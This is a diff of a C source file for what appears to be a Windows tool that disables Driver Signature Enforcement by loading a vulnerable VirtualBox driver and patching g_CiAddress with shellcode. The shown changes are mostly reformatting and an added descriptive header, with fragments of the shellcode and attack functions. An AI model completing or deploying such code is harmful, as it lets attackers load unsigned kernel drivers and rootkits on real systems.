@@ -1,16 +1,19 @@
-#include "ntdll\ntdll.h"
-#include "ntdll\ntstatus.h"
-#include "SignatureSlip.h"
-#include "vbox.h"
-#include "vboxdrv.h"
-#include "ldasm.h"
-#include "rtls\prtl.h"
-#include "ntdll\winnative.h"
-
+///////////////////////////////////////////////////////////////////////////////////////////////////
+// The code demonstrates sophisticated techniques including direct manipulation 
+// of system internals and use of low-level APIs to disable or enable Driver 
+// Signature Enforcement (DSE). It involves complex operations like parsing and 
+// modifying PE headers, base relocation, and using custom shellcode. 
+// The ControlDSE function involves kernel-level interactions and dynamic allocation 
+// to execute operations on a vulnerable driver, potentially affecting system stability 
+// and security. The usage of undocumented functions and manipulation of internal structures 
+// like g_CiAddress and CiInitialize...
+///////////////////////////////////////////////////////////////////////////////////////////////////
+//-------------------------------------------------------------------------------------------------
 #pragma data_seg("Shared")
 volatile LONG g_lApplicationInstances = 0;
 #pragma data_seg()
 #pragma comment(linker, "/Section:Shared,RWS")
+//-------------------------------------------------------------------------------------------------
 
 RTL_OSVERSIONINFOEXW      osv;
 
@@ -29,7 +32,8 @@ const unsigned char shellcode2[] = {
    0x48, 0x31, 0xc0, 0xb0, 0x06, 0xc3  // xor rax, rax; mov al, 6; ret
 };
 
-DWORD align_gt(DWORD p, DWORD align)
+DWORD 
+align_gt(DWORD p, DWORD align)
 {
    if ( (p % align) == 0 )
       return p;
@@ -37,7 +41,8 @@ DWORD align_gt(DWORD p, DWORD align)
    return p + align - (p % align);
 }
 
-DWORD align_le(DWORD p, DWORD align)
+DWORD 
+align_le(DWORD p, DWORD align)
 {
    if ( (p % align) == 0 )
       return p;
@@ -45,7 +50,9 @@ DWORD align_le(DWORD p, DWORD align)
    return p - (p % align);
 }
 
-LPVOID PELoaderLoadImage(IN LPVOID Buffer, PDWORD SizeOfImage)
+//-------------------------------------------------------------------------------------------------
+LPVOID 
+PELoaderLoadImage(IN LPVOID Buffer, PDWORD SizeOfImage)
 {
     LPVOID exeBuffer = NULL;
     PIMAGE_DOS_HEADER dosh = (PIMAGE_DOS_HEADER)Buffer;
@@ -138,7 +145,9 @@ LPVOID PELoaderLoadImage(IN LPVOID Buffer, PDWORD SizeOfImage)
     return NULL;
 }
 
-LPVOID PELoaderGetProcAddress(LPVOID ImageBase, PCHAR RoutineName)
+//-------------------------------------------------------------------------------------------------
+LPVOID 
+PELoaderGetProcAddress(LPVOID ImageBase, PCHAR RoutineName)
 {
     PIMAGE_EXPORT_DIRECTORY ExportDirectory = NULL;
     PIMAGE_FILE_HEADER fh1 = NULL;
@@ -206,7 +215,9 @@ LPVOID PELoaderGetProcAddress(LPVOID ImageBase, PCHAR RoutineName)
     return (LPVOID)((PBYTE)ImageBase + Addr[OrdinalNumber]);
 }
 
-BOOL ControlDSE(HANDLE hDriver, ULONG_PTR g_CiAddress, PVOID shellcode)
+//-------------------------------------------------------------------------------------------------
+BOOL 
+ControlDSE(HANDLE hDriver, ULONG_PTR g_CiAddress, PVOID shellcode)
 {
    BOOL         bRes = FALSE;
    SUPCOOKIE      Cookie;
@@ -296,7 +307,9 @@ fail:
    return bRes;
 }
 
-BOOL DSEfuckME(HANDLE hDriver, BOOL bDisable)
+//-------------------------------------------------------------------------------------------------
+BOOL 
+DSEfuckME(HANDLE hDriver, BOOL bDisable)
 {
    BOOL                  bRes = FALSE;
    PRTL_PROCESS_MODULES      miSpace = NULL;
@@ -452,7 +465,9 @@ if (osv.dwMajorVersion >= 10) {
    return bRes;
 }
 
-HANDLE LoadVulnerableDriver(
+//-------------------------------------------------------------------------------------------------
+HANDLE 
+LoadVulnerableDriver(
    VOID
    )
 {
@@ -486,6 +501,7 @@ HANDLE LoadVulnerableDriver(
    return hDriver;
 }
 
+//-------------------------------------------------------------------------------------------------
 void UnloadVulnerableDriver(
    VOID
    )
@@ -494,7 +510,9 @@ void UnloadVulnerableDriver(
    NativeRegDeleteKeyRecursive(0, VBoxDrvRegPath);
 }
 
-void main()
+//-------------------------------------------------------------------------------------------------
+void 
+main()
 {
    LONG x;
    ULONG l = 0;
@@ -560,3 +578,4 @@ void main()
    OutputDebugStringA("[#] Finish");
    ExitProcess(0);
 }
+//-------------------------------------------------------------------------------------------------
